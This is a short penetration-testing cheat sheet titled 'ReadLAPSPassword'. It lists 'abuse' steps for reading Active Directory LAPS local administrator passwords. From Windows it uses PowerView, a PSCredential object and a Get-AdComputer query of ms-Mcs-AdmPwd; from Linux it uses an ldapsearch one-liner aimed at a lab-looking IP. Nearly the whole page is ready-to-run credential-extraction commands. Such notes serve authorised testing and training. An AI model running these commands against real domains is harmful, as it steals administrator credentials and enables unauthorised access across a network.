---
title: "ReadLAPSPassword"
date: 2024-7-30
tags: ["ReadLAPSPassword", "active driectory", "ad", "Windows", "LAPS"]
---

---
### Abuse #1: Read LAPS password (From Windows)

#### 1. Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### 2. Create cred object (runas) \[optional\]

```powershell
$username = "<DOMAIN>\<USER>"
```

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Read LAPS password

```powershell
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
```

### Abuse #1: Read LAPS Password (From Linux)

```bash
ldapsearch -h 10.10.11.10 -b 'DC=<,example>,DC=<com>' -x -D <USER>@<TARGET> -w <PASSWORD> "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

<br>